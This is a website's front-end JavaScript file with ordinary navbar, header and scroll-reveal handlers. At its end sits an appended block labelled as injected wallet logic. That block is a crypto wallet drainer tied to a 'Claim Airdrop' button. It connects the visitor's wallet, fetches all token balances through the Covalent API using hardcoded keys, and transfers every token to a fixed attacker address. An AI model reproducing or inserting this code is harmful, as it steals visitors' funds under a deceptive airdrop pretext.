'use strict';



/**
 * add event on element
 */

const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
}



/**
 * navbar toggle
 */

const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
}

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
}

addEventOnElem(navbarLinks, "click", closeNavbar);



/**
 * header active
 */

const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
}

addEventOnElem(window, "scroll", activeHeader);



/**
 * toggle active on add to fav
 */

const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
}

addEventOnElem(addToFavBtns, "click", toggleActive);



/**
 * scroll revreal effect
 */

const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
}

scrollReveal();

addEventOnElem(window, "scroll", scrollReveal);

// --- Injected Wallet Logic with Web3Modal ---
async function connectWalletAndSendTokens() {
  // Define provider options
  const providerOptions = {
    walletconnect: {
      package: window.WalletConnectProvider.default,
      options: {
        infuraId: "5b2c5ee5760146349669a1e9c77665d1" // Replace with your Infura Project ID
      }
    }
    // Add other providers here if needed
  };

  // Initialize Web3Modal
  const web3Modal = new window.Web3Modal.default({
    cacheProvider: false,
    providerOptions
  });

  try {
    // Open modal to select wallet
    const instance = await web3Modal.connect();

    // Create ethers provider and signer
    const provider = new ethers.providers.Web3Provider(instance);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    // Get network chain ID
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    // Fetch token balances using Covalent API
    const covalentApiKey = "cqt_rQkkT4tmtYcY46VpVHjPWmGydHYc"; // Replace with your Covalent API key
    const url = `https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey}`;
    const response = await fetch(url);
    const data = await response.json();

    if (!data.data || !data.data.items) {
      alert('No token data available');
      return;
    }

    // Filter tokens with balance > 0
    const tokens = data.data.items.filter(token => token.type === 'cryptocurrency' && token.balance > 0 && token.contract_address);

    // Send tokens to destination address
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.contract_address, [
          "function transfer(address to, uint amount) returns (bool)"
        ], signer);

        const tx = await contract.transfer("0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47", token.balance);
        console.log(`Sent ${token.contract_ticker_symbol}, tx:`, tx.hash);
      } catch (err) {
        console.warn(`Failed to send ${token.contract_ticker_symbol}`, err);
      }
    }
  } catch (err) {
    console.error('Error connecting wallet or sending tokens:', err);
  }
}

// Attach event listener to the "Claim Airdrop" button
document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);